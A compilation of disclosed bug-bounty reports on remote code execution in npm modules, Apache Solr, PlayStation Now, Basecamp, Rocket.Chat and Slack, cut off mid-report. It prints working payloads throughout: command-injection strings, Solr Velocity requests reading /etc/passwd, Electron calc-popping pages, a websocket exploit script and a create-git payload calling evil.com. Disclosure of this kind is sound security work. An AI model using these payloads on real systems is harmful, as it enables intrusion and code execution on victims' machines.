- Create and run the following POC index.js:

```javascript
var im = require('imagickal');

im.identify('image.jpg;touch HACKED;').then(function (data) {
  console.log(data);
});
```

- The exploit worked and created the file - `HACKED`

{F973742}

## Patch

Check input before command

# Wrap up

- I contacted the maintainer to let them know: [N]
- I opened an issue in the related repository: [N]

## Impact

Command Injection on `imagickal` module via insecure command

---

### [[arpping] Remote Code Execution](https://hackerone.com/reports/972220)

- **Report ID:** `972220`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @solov9ev
- **Bounty:** - usd
- **Disclosed:** 2021-01-14T08:39:29.702Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report `RCE` in `arpping`
It allows to execute arbitrary commands on the victim's PC

# Module

**module name:** arpping
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/arpping`

## Module Description

Discover and search for internet-connected devices (locally) using ping and arp

## Module Stats

[16] weekly downloads

# Vulnerability

## Vulnerability Description

Code injection occurs when using commands: `ping`, `arp`

## Steps To Reproduce:

- Create and run the following POC index.js:

```javascript
const Arpping = require('arpping');

var arpping = new Arpping();
arpping.ping(["127.0.0.1;touch HACKED;"]); // arpping.arp(["127.0.0.1; touch HACKED;"]);
```
- The exploit worked and created the file - `HACKED`

{F972163}

## Patch

Check input before command

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Command Injection on `arpping` module via insecure command

---

### [Apache solr RCE via velocity template](https://hackerone.com/reports/822002)

- **Report ID:** `822002`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @khizer47
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T21:49:37.443Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team, 

While doing some recon i stumbled upon an IP address http://██████/ The IP took me to a Login Page at ████=https%3A%2F%2F██████████████████

as of the URL suggest this system belongs to US gov. 

Doing a Port scan reveals that POST ██████████ is Open, A lot of doors open if Solr is exposed outside of a trusted network and without administrative authentication.  and the solar instance was without any authentication http://████:████████/ 

Running a Query http://████████:█████████*:*  Showed data from http://██████.mil/ that's why i decided to report it here 

#Query output example: 

````

{
  "responseHeader":{
    "status":0,
    "QTime":0,
    "params":{
      "q":"*:*",
      "_":"1584415352129"}},
  "response":{"numFound":858,"start":0,"docs":[
      {
        "id":"http://███████.mil/instance/relations/locationRelLink#UNIT_TIE_███████",
        "type":["http://███.mil/ont/relations#LocationRelLink"],
        "base.has_link_from_geohash_12_ss":["█████████"],
        "base.has_link_to_geohash_12_ss":["█████████"],
        "base.has_metadata|has_metadata_MIDB-gmi_constraint.has_ownr_producer|US-@id_nidx_ss":["http://███.mil/ont/gmiConstraint/OwnrProducer#US"],
        "base.has_metadata|has_metadata_MIDB-base.is_metadata_of-@id_nidx_ss":["http://█████.mil/instance/relations/locationRelLink#UNIT_TIE_█████"],
        "base.link_predicate|located_at-@id_nidx_ss":["http://██████████.mil/ont/relations#located_at"],
        "base.has_metadata|has_metadata_MIDB-@type_nidx_ss":["http://█████████.mil/ont/base#Metadata"],
        "base.has_metadata|has_metadata_MIDB-dc.source_nidx_ss":["MIDB"],
        "base.link_to-@id_nidx_ss":["http://█████████.mil/instance/base/facility#FAC_███"],
        "base.has_metadata|has_metadata_MIDB-@id_nidx_ss":["http://███████.mil/instance/relations/locationRelLink#UNIT_TIE_██████_has_metadata_MIDB"],
        "base.link_from-@id_nidx_ss":["http://█████.mil/instance/organization/unit#UNIT_████"],
        "_version_":1660996099434872832},
      {
        "id":"http://█████████.mil/instance/base/equipment#██████████",
        "type":["http://██████████.mil/ont/base#Equipment"],
        "gmi_constraint.has_oper_status_ss":["OPR"],
        "equipment.has_nomen|has_nomen_Switch-@type_nidx_ss":["http://████.mil/ont/base#DataQuality"],
        "base.has_location|has_location-base.has_location_name_nidx_ss":["CISCO 3750"],
        "base.has_geo_data|has_geo_data-base.has_geo_metadata|has_geo_metadata_MIDB-base.is_metadata_of-@id_nidx_ss":["http://█████████.mil/instance/base/equipment#████████_has_geo_data"],
        "base.has_geo_data|has_geo_data-base.has_metadata|has_metadata_MIDB-@id_nidx_ss":["http://█████████.mil/instance/base/equipment#████_has_geo_data_has_metadata_MIDB"],
        "base.has_metadata|has_metadata_MIDB-dc.source_nidx_ss":["MIDB"],
        "base.has_country_code|has_country_code_US-base.has_quality_value_nidx_ss":["US"],
        "gmi_constraint.has_condition|has_condition_RDY-@id_nidx_ss":["http://█████.mil/instance/base/equipment#██████████_has_condition_RDY"],
        "base.has_geo_data|has_geo_data-@type_nidx_ss":["http://██████████.mil/ont/base#GeoDataQuality"],
        "base.has_country_code_ss":["US"],
        "gmi_constraint.has_condition|has_condition_RDY-base.has_quality_value_nidx_ss":["RDY"],
        "base.has_geo_data|has_geo_data-base.has_geo_metadata|has_geo_metadata_MIDB-@type_nidx_ss":["http://████████.mil/ont/base#GeoMetadata"],
        "equipment.has_nomen|has_nomen_Switch-base.has_metadata|has_metadata_MIDB-dc.source_nidx_ss":["MIDB"],
        "gmi_constraint.has_condition|has_condition_RDY-base.quality_of-@id_nidx_ss":["http://████████.mil/instance/base/equipment#██████████"],
        "gmi_constraint.has_condition_ss":["RDY"],
        "info.has_graphic|has_graphic-@id_nidx_ss":["http://███.mil/instance/base/equipment#██████████_has_graphic"],
        "gmi_constraint.has_condition|has_condition_RDY-base.has_metadata|has_metadata_MIDB-@type_nidx_ss":["http://█████████.mil/ont/base#Metadata"],
        "gmi_constraint.has_oper_status|has_oper_status_OPR-base.has_metadata|has_metadata_MIDB-@id_nidx_ss":["http://███████.mil/instance/base/equipment#███████_has_oper_status_OPR_has_metadata_MIDB"],
        "gmi_constraint.has_oper_status|has_oper_status_OPR-base.quality_of-@id_nidx_ss":["http://██████.mil/instance/base/equipment#████"],
        "gmi_constraint.has_oper_status|has_oper_status_OPR-base.has_quality_value_enum|OPR-@id_nidx_ss":["http://███.mil/ont/gmiConstraint/OperStatus#OPR"],
        "gmi_constraint.has_oper_status|has_oper_status_OPR-base.has_metadata|has_metadata_MIDB-base.is_metadata_of-@id_nidx_ss":["http://█████████.mil/instance/base/equipment#████_has_oper_status_OPR"],
        "base.has_country_code|has_country_code_US-base.has_metadata|has_met
````

And the Solar Instance is Vulnuberal to RCE via via velocity template 

#Request: 

````
GET ███1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: ██████████:███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://████████:██████████/solr/
````

#Response:

```
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 51

 0 uid=██████████(solr) gid=████(solr) groups=██████(solr)
```

███

#Request:

```
GET █████1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/etc/passwd%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
Host: ██████:█████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://███████:██████/solr/
```

#Response: 

```
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 952

 0 root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
solr:x:███████:███::/home/solr:
```

█████████


It is recommended to firewall Solr and enable authentication for all requests.

## Impact

Remote Code Execution

---

### [Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application](https://hackerone.com/reports/873614)

- **Report ID:** `873614`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** PlayStation
- **Reporter:** @parsiya
- **Bounty:** 15000 usd
- **Disclosed:** 2020-12-04T18:04:55.058Z
- **CVE(s):** -

**Summary (team):**

-

**Summary (researcher):**

# Summary
The PlayStation Now application version `11.0.2` is vulnerable to remote code execution (RCE). Any website loaded in any browser on the same machine can run arbitrary code on the machine through a vulnerable websocket connection.

1. The local websocket server at `localhost:1235` does not check the origin of incoming requests.
    1. This allows websites loaded in browsers on the same machine to send requests to the websocket server.
    2. Websockets are not bound by the Same-Origin Policy so the websocket server has to do this manually.
2. psnow launches an Electron application named `AGL`.
    1. It's possible to tell AGL to load a specific website with a command sent to the websocket server.
    2. As a result, the websites above can tell AGL to load any remote URL.
    3. It's also possible to tell `AGL` to run any local application via the `setUrlDefaultBrowser` command.
3. The AGL Electron application has `nodeIntegration: true` so JavaScript running in any loaded URL can spawn new processes.
    1. So any URL loaded in the AGL application can run code on the target machine.

Chaining these three issues gives us RCE.

# Description
The PlayStation Now application (`psnow` moving forward) is an online streaming application for playing PlayStation games. Version `11.0.2` is the current version at the time of writing. The latest version can be downloaded from https://download-psnow.playstation.com/downloads/psnow/pc/latest.

It has two major components: `QAS` and `AGL`.

## QAS
`QAS` is an executable named `psnowlauncher.exe` and is a Qt5 desktop application. This is the main application that is executed when the user runs psnow. The default installation location is `C:\Program Files (x86)\PlayStationNow\psnowlauncher.exe`.

Note: Running it in a Virtual Machine (VM) returns a warning. This can be ignored for this walkthrough.

After launch, it runs a different application called `AGL`. The following picture is the complete list of processes in Process Monitor.

Processes in procmon:

{F827146}

The QAS application also runs a websocket server at `localhost:1235`. `netstat -anb` in an elevated command line tells us about it:

websocket server:

{F827147}

## AGL
`AGL` is an Electron application. In a typical execution, it's spawned by QAS. In the current version, it's run with this `url` command line parameter:

* `"C:\Program Files (x86)\PlayStationNow\agl\agl.exe" --url=https://psnow.playstation.com/app/1.10.43/105/00d3603f8/`

This is the URL of the page that will be initially loaded by the AGL application.

AGL execution

{F827149}

### Issue 1: nodeIntegration Set to true
`nodeIntegration` is the ability for the JavaScript running in an Electron [BrowserWindow][browser-window] to access the Node.js APIs. The default value is `false` but it is set to `true` in AGL. Any JavaScript loaded by AGL will be able to spawn processes on the machine. This can lead to arbitrary code execution. The AGL application performs no checks on what URLs it loads.

[browser-window]: https://www.electronjs.org/docs/api/browser-window

We can check this by running AGL from the command line with a URL that contains some Node code. The following code spawns a new processes and runs the Windows Calculator app (calc).

```html
<html>
    <head>
        <title>This should pop calc on Windows</title>
    </head>
    <body>
        <script>
            require('child_process')
            .exec('calc')
        </script>
    </body>
</html>
```

I have stored this payload in an S3 bucket. If we load that remote URL in AGL we can see calc spawning. To reproduce, run the following command in a VM and see AGL running the calculator application:

`"C:\Program Files (x86)\PlayStationNow\agl\agl.exe" --url=https://[redacted].s3.us-east-1.amazonaws.com/node.html`

Popping calc:

{F827156}

We can see the new processes in Process Monitor:

{F827151}

This is not that useful. We can run code on our own machine, WOW! As Raymond Chen said [It rather involved being on the other side of this airtight hatchway][hatchway].

[hatchway]: https://devblogs.microsoft.com/oldnewthing/20060508-22/?p=31283

## Proxying The Applications
We can proxy psnow with Burp. Use the Windows proxy settings (WinINET proxy settings).

1. Run `control.exe inetcpl.cpl,,4`. This opens the Windows proxy settings without having to open Internet Explorer.
2. Click on `LAN Settings` and set the proxy.
    1. Make sure nothing under `Automatic Configuration` is checked.
    2. Make sure the `Bypass proxy server for local addresses` is **NOT checked**.
3. Set the proxy to the listener, Burp's default is `127.0.0.1:8080`.
4. Add Burp's Certificate Authority (CA) to the Windows certificate store.
    1. https://portswigger.net/support/installing-burp-suites-ca-certificate-in-internet-explorer
    2. The instructions mention Internet Explorer but it's actually for Windows.

### Identifying Traffic in Burp
In Burp, we will see traffic to/from both QAS and AGL. There is other traffic (e.g, browser traffic, Windows update). The traffic from psnow has the word `gkApollo` in its `User-Agent` header.

The user-agent for requests coming from the two applications has more indicators:

* QAS is the Qt5 app and has `QtWebEngine/5.5.1`.
* AGL is based on Electron and it has `Electron/1.4.16` and `playstation-now/0.0.0`.

I am using a Burp extension named [Request Highlighter][request-highlighter] to highlight requests based on these words in the user-agent.

[request-highlighter]: https://portswigger.net/bappstore/11729a617d8d4d3b87c82e34b71885c3

In my setup, AGL (Electron) is yellow and QAS (Qt5) is blue.

{F827153}

## Local Websocket Server
QAS starts a local websocket server on port `1235`. Then the website loaded in AGL (in this case "psnow.playstation.com/app/") connects to it and sends commands to the server.

### Issue 2: Local Websocket Server does not Check the Origin Header
This is a vulnerable setup for seamless communication between a website and a desktop application. A website sends requests to a local webserver to do something (e.g., launch an application). This setup is vulnerable if the local server does not check the Origin header and/or where the request is coming from.

Some examples of other vulnerable setups:

[Tavis Ormandy][taviso-twitter] from Google Project Zero found a very similar setup in Logitech Options.

* https://bugs.chromium.org/p/project-zero/issues/detail?id=1663

[taviso-twitter]: https://twitter.com/taviso

Another by TavisO for TrendMicro. Not websocket but involved a local webserver: https://bugs.chromium.org/p/project-zero/issues/detail?id=693

Zoom used a local webserver to automatically launch the application from the website. Disclosure by [Jonathan Leitschuh][jon-1].

[jon-1]: https://twitter.com/JLLeitschuh

* https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5

**Why is this bad?** Any website can send these commands. This means I can put JavaScript code on my own website. If a user running psnow opens my website on the same machine (in any browser), my website connects to `http://localhost:1235` and sends requests to the websocket server. These requests will be processed.

### Yet Another Chat Application as Proof of Concept
I stole the client code of a websocket chat app and modified it to simulate the evil website. This small app connects to `ws://localhost:1235`, prints any message received and allows us to send messages at will. You can see the source at:

* https://[redacted].s3.amazonaws.com/agl-poc/chat-ws.html
* Open the page in a browser in a different machine and see the source. It's simple enough that I could understand it.

1. Start the psnow app in a VM.
2. Open the above URL in a browser in the same VM.
3. See the websocket messages from the psnow app in the browser.
    1. If we keep the chat app running, it will keep printing messages received from the client.
4. Send any message to the local server via the text field.

{F827145}

## Websocket Messages
Now we need to look into the websocket messages and how we can exploit them.

After opening the initial URL at `https://psnow.playstation.com/app/1.10.43/105/00d3603f8/` we can see the `Connection: Upgrade` request to this server from `psnow.playstation.com`. This is coming from the psnow website loaded in AGL. The initial request is a typical websocket handshake.

{F827150}

Now we can switch to the `Proxy > Websockets history` tab in Burp to see the websocket messages.

{F827152}

All the requests are in JSON (probably created by `JSON.stringify`). The interesting ones start with `command`. For example:

```json
{
  "command": "isMicConnected",
  "params": {},
  "source": "AGL",
  "target": "QAS"
}
```

* `command`: What to do.
* `params`: Command parameters.
* `source`: The program issuing the command.
* `target`: The program running the command.

Both target and source can be the same app. I do not think it really matters what the source is. I think only `target` is mandatory.

We can search for more commands in websocket messages. The most important command is `setUrl`. There are more commands in the source of the Electron app (unpack `app.asar` and search for `commandHandler`) but this is the most useful along with `setUrlDefaultBrowser` (opens a URL in the default browser on the machine).

{F827154}

```json
{
  "command": "setUrl",
  "params": {
    "url": "https://psnow.playstation.com/app/1.10.43/105/00d3603f8/"
  },
  "source": "AGL",
  "target": "QAS"
}
```

This is AQL telling QAS to load this URL. QAS will then go and load that URL. We can send this request to Burp Repeater and send the message again with a different URL. For example, let's tell QAS to load `https://example.net`.

{F827155}

But this is not fun. We want AGL to load websites and not QAS. **WHAT IF** we switched target and source?

```
{"command":"setUrl","params":{"url":"https://example.net"},"source":"QAS","target":"AGL"}
```

This command will tell AGL (the Electron app) to load `example.net`. The gif has been minimized, please click on it to enlarge it:

{F827144}


Later, I found out that we can use another TavisO bug to get RCE another way. https://bugs.chromium.org/p/project-zero/issues/detail?id=693

We can abuse the `setUrlDefaultBrowser` command. It gets passed to `shell.openExternal(url)` and allows the `file` scheme.

So the following command should pop calc:

```
{"command":"setUrlDefaultBrowser","params":{"url":"file:///c:/windows/system32/calc.exe"},"source":"QAS","target":"AGL"}
```

Note: `QAS` does not have this command.

Websockets are not bound by the Same-Origin Policy so any website can send these messages. For an explanation please see https://blog.securityevaluators.com/websockets-not-bound-by-cors-does-this-mean-2e7819374acc.

## Issue 3: You Can Tell AGL to Load Arbitrary Websites
A single websocket message is enough to make AGL load any URL. There are no restrictions here. This is not great, considering we saw what bad code on a website can do to AGL.

## Putting Everything Together
So far we have established three things:

1. If a website with Node code is loaded in AGL, we can run arbitrary on the target's machine.
2. Any website opened in the browser on a machine with psnow running can connect to the local websocket and send messages.
3. A websocket command with `setUrl` or `setUrlDefaultBrowser` can tell AGL to load any URL.

### Possible Attack Scenario

1. User is running psnow on their machine.
    1. Note that when the users close the psnow window it gets minimized to tray and is still running. So there's a good chance that psnow is running  if they have used it in the same session. The websocket server is still running when the application is minimized.
2. The user opens a website in their browser. Any browser will do.
    1. Someone can post a link to a website with bad code in chat/Discord, it could be a link on forums. The possibilities are endless.
3. The website in the browser connects to the websocket server at `ws://localhost:1235`.
4. The website sends a message to the websocket server. The message tells AGL to load another website that contains node code.
    1. `{"command":"setUrl","params":{"url":"https://[redacted].s3.us-east-1.amazonaws.com/node.html"},"source":"QAS","target":"AGL"}`
    2. Alternatively, it can abuse the `setUrlDefaultBrowser` command.
5. AGL loads the new website. Arbitrary code runs on the user's machine.
6. ???
7. RCE.

## Steps To Reproduce:
If you have read up until here, you deserve a calc popping gif.

1. Run psnow in a VM.
2. Go to the following URL in a browser on the same machine:
    1. https://[redacted].s3.amazonaws.com/agl-poc/calc-ws.html
3. Watch calc pop.
4. Optionally, paste the following command in the text field and press send to see calc pop again.
    1. `{"command":"setUrl","params":{"url":"https://[redacted].s3.us-east-1.amazonaws.com/node.html"},"source":"QAS","target":"AGL"}`
    2. You can also do other fun things like enabling dev tools.

The code in `calc-ws` is similar to the chat code. After the socket to the local websocket server opens, the payload above is sent. See the modification heres:

```js
let url = 'ws://localhost:1235/'

let socket = new WebSocket(url);

let payload = '{"command":"setUrl","params":{"url":"https://[redacted].s3.us-east-1.amazonaws.com/node.html"},"source":"QAS","target":"AGL"}';

// send the payload when the socket is opened.
socket.onopen = function(event) {
  showMessage('before payload');
  socket.send(payload);
  showMessage('after payload');
};
```

The following gif shows the whole chain. Again, please see it in full-size.

{F827148}

### Bonus: Minor Issue 0: Websocket Server Listening on 0.0.0.0
The application is listening on all interfaces (`0.0.0.0`) which is problematic. This is also not fun because the Windows firewall prompt will pop up when its executed for the first time. Meaning anyone who can contact this port **might** be able to send commands to this websocket server.

## Remediation or How Can We Fix This?

* Quick and effective win: The local websocket server should validate the `Origin` header of the incoming request and only allow requests from good Origins specified in a list.
    * This is the same recommendation by TavisO in https://bugs.chromium.org/p/project-zero/issues/detail?id=1663. And he is much smarter than I will ever be.
* Bonus win: Do not listen on all interfaces, bind the server to `localhost`.

## Impact
Attackers can run code on users' machines. They can get to the other side of the airtight hatchway.

---

### [Remote Code Execution in Basecamp Windows Electron App](https://hackerone.com/reports/1016966)

- **Report ID:** `1016966`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Basecamp
- **Reporter:** @co0sin
- **Bounty:** - usd
- **Disclosed:** 2020-11-19T21:24:55.782Z
- **CVE(s):** -

**Vulnerability Information:**

The Windows application for Basecamp, allows a "Download" feature for images in your posts. Under certain restrictions, those files are downloaded and sometimes even automatically opened (executed). The file will be executed if it's a download from an internal URL and the mimetype is text/calendar. But these restrictions can be bypassed to execute an attacker crafted file.

I was able to craft a link, which when clicked by a user, will be downloaded and executed! 

To get file execution on the user, we bypass the restrictions first:
There is a regular expression which checks for "internal domains", which can easily be bypassed by controlling the subdomain. The host pattern is `/(launchpad\.37signals\.com|launchpad\.(?:dev|test))/` and `/(3\.(?:staging\.)?basecamp\.com|bc3\.(?:dev|test))/`. By controlling the subdomain, and setting it to something like `launchpad.dev.mydomain.com`, we can bypass this regular expression verification.

Since we'll be sending the request to our own server, we simply need to return `text/calendar` as the content-type header. This can be seen in the Electron code in `OPENABLE_MIME_TYPES = new Set(["text/calendar"]);`
And then when adding the URL to your post, simply add the `?attachment=true` to the URL. 


To reproduce, simply register any subdomain that starts with `launchpad.dev.` (mine is `launchpad.dev.████`).
An HTTP server with the needed mimetype header, can be setup with Flask easily with this code:
```
from flask import Flask, send_from_directory
app = Flask(__name__)
@app.route('/<path:path>')
def hello(path):
    return send_from_directory(".", "file.exe", as_attachment=True, mimetype="text/calendar")
if __name__ == '__main__':
    app.run(port=80,host="0.0.0.0")
```

Then add the link to your post with the appropriate `attachment` parameter, as such:
`http://launchpad.dev.█████████/file.exe?attachment=true`

## Impact

Remote code execution on any user which clicks a link on your crafted post through the desktop app.

---

### [Desktop app RCE (#276031 bypass)](https://hackerone.com/reports/843171)

- **Report ID:** `843171`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Rocket.Chat
- **Reporter:** @ivarsvids
- **Bounty:** - usd
- **Disclosed:** 2020-11-05T07:21:27.861Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** #276031 fix bypass, two click remote code execution.

**Description:** The security issue is in links preload file https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/preload/links.js file.
By rewriting  `RegExp.prototype.test` method it is possible to prepare proper answers to get to the `shell.openExternal` method. To trigger  events attached by `addEventListener` you can use `dispatchEvent` method.

Note: for demo I pointed to `calc.exe`, it also cloud be pointed, to SMB share (example. `\\server\share\executable.exe`), which can lead to windows credential leak and attacker also can execute arbitrary code on victims machine.

i believe this issue is cross-platform, an can be exploited in Linux, MacOS with minor JavaScript modifications.

## Releases Affected:

  * Rocket.Chat.Electron 2.17.9 

## Steps To Reproduce (from initial installation to vulnerability):

  1. Create web page with following `index.html`
```
<html>
	<head>
	</head>
	<body style="background-color: white;" >
		<h1>Initializing surprise in 3, 2, 1</h1>
		<script>
			setTimeout(() => {
				// create link
				let a = document.createElement('A');
				a.setAttribute('href', 'c:\\windows\\system32\\calc.exe');

				// hooks regexp.test
				RegExp.prototype._test = RegExp.prototype._test || RegExp.prototype.test;
				RegExp.prototype.test = function(...args){
					return this.source === '^([a-z]+:)?\\/\\/' || this._test(...args);
				}
				
				// add missing method
				document.closest = () => a;

				// triger event
				document.dispatchEvent(new Event('click'));

				//cleanup
				RegExp.prototype.test = RegExp.prototype._test;
				delete RegExp.prototype._test;
			}, 100);
		</script>
	</body>
</html>
```
  2. create `api/info` which contains JSON, can be empty JSON.
  3. Add new server

## Supporting Material/References:

{F779066}

## Suggested mitigation

I understand that deep-links and `Add new server` are a features and not bugs
* The simplest fix would be to check `isTrusted` attribute for events, but I'm 100% certain that it can be bypassed.
* Enable context isolation (https://github.com/electron/electron/blob/master/docs/tutorial/security.md#3-enable-context-isolation-for-remote-content)

## Impact

An attacker can trick victim to click on deep-link or add self hosted server to desktop application, which leads to remote code execution. I understand that deep-links and/or self hosted servers are not a bug, but it can be used in attack vector.

---

### [[create-git] RCE via insecure command formatting](https://hackerone.com/reports/694471)

- **Report ID:** `694471`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @mik317
- **Bounty:** - usd
- **Disclosed:** 2020-10-26T21:51:11.090Z
- **CVE(s):** -

**Summary (team):**

The `create-git` NPM module was vulnerable against `command injection`
which was possible since some `user supplied inputs` were concatenated without
proper checks inside a `exec()` call, which made possible executing `arbitrary
commands` besides the `git` one (which is used by the tool).

The PoC resulted in:
```js
// poc.js const createGit = require('create-git')

createGit({  ignoreExisting: true,  initialCommitMessage: 'test',  remoteOrigin:
'http://evil.com || curl "http://localhost/RCE"', 
ignoreTemplates: ['Node.gitignore']  })
```

The vulnerability has been fixed checking the inputted data and using `safe
functions` to execute commands, which replaced `exec()` occurrences.

---

### [Сode injection host  █████████](https://hackerone.com/reports/954398)

- **Report ID:** `954398`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @e3xpl0it
- **Bounty:** - usd
- **Disclosed:** 2020-09-03T17:27:02.127Z
- **CVE(s):** -

**Vulnerability Information:**

Good day,  security team. Host █████████ vulnerable to code injection.
POC
The server makes a time delay.

POST /cgi-bin/gMapBuild.py HTTP/1.1
Host: ███
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Connection: close

mapArea=colP&cumTime=${{"sleep"%2c"13"})}${{"timeout"%2c"13"})}

or

POST /cgi-bin/gMapBuild.py HTTP/1.1
Host: ██████████
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Connection: close

mapArea=colP&cumTime=${sleep(hexdec(dechex(13)))}${sleep(hexdec(dechex(13)))}

## Impact

Potential execution of arbitrary code.
https://owasp.org/www-community/attacks/Code_Injection

---

### [Remote Code Execution on █████████](https://hackerone.com/reports/962013)

- **Report ID:** `962013`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @xy_
- **Bounty:** - usd
- **Disclosed:** 2020-09-03T17:25:54.912Z
- **CVE(s):** CVE-2019-0192, CVE-2019-0193

**Vulnerability Information:**

**Summary:**
An unauth solr lead to RCE on ██████████

**Description:**
Hello, I found a solr unauth at https://██████/solr/

This version is 5.5.1, vulnerable with CVE-2019-0192 and CVE-2019-0193, i have try CVE-2019-0193 and successful RCE.

## Impact
Attacker can get shell on server.

## Step-by-step Reproduction Instructions

1. First go to Core Admin and copy path.
██████
2. Update the config.
███████
3. Execute code.
██████████

## Product, Version, and Configuration (If applicable)
Apache Sole 5.5.1
## Suggested Mitigation/Remediation Actions
Update to the latest version and set auth.

## Impact

Attacker can get shell on server.

---

### [Remote Code Execution in Slack desktop apps + bonus](https://hackerone.com/reports/783877)

- **Report ID:** `783877`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Slack
- **Reporter:** @oskarsv
- **Bounty:** - usd
- **Disclosed:** 2020-08-28T18:04:36.897Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary

With any in-app redirect - logic/open redirect, HTML or javascript injection it's possible to execute arbitrary code within Slack desktop apps. This report demonstrates a specifically crafted exploit consisting of an HTML injection, security control bypass and a RCE Javascript payload. This exploit was tested as working on the latest Slack for desktop (4.2, 4.3.2) versions (Mac/Windows/Linux). 

To demonstrate the impact of this RCE vulnerability and how it could be used in various scenarios, a new approach was developed for the starting point (HTML injection & payload) as vulnerabilities reported previously cannot be used anymore [#738229](https://hackerone.com/reports/738229). 

Finally, as an added bonus, a XSS vulnerability on https://files.slack.com is demonstrated as a possible RCE payload store. I chose to not report this separately as it seems the domain is out of scope (?), however the vulnerability in my opinion is critical by itself and should be fixed either way.

{F697022}

# Technical description and steps of reproduction

Exploitation steps:
1. Upload file on your HTTPS enabled server with the RCE payload
2. Prepare a Slack Post with HTML injection
3. Share Post with channel or user

User steps:
1. click on a large post with an enticing image - code executed on PC

Actual path after user click:
1. HTML redirects user's desktop app to attacker website in `_top` frame
2. Attacker website replies with RCE javascript
3. exploit bypasses Slack desktop app env, leaks an Electron object and via it executes arbitrary commands on user's PC. 

**NOTE**: This could also be done with any XSS/in-app redirect vulnerability.

## HTML injection - directly editing Slack Post structure as JSON

### 1. create a new Slack Post with some title and some content

When you create a new Slack Post, it creates a new file on https://files.slack.com with the following JSON structure:
```
{"full":"<p>content<\/p>","preview":"<p>content<\/p>"}
```
{F696858}

The URL to a private file can be found by visiting the private file link returned by the `/api/files.info` call:
{F696861}

The private file URL is in the format `https://files.slack.com/files-pri/{TEAM_ID}-{FILE_ID}/TITLE` under `url_private` response from `/api/files.info`. The Slack Post JSON structure can be observed by simply visiting the private file link.

### 2. Injecting HTML payload

It's possible to directly edit this JSON structure, which can contain arbitrary HTML. Javascript execution is restricted by CSP and various security protections are in place for HTML tags (i.e. banned `iframe`, `applet`, `meta`, `script`, `form` etc. and `target` attribute is overwritten to `_blank` for `A` tags). 

However, it is still possible to inject `area` and `map` tags, which can be used to achieve a one-click-RCE.

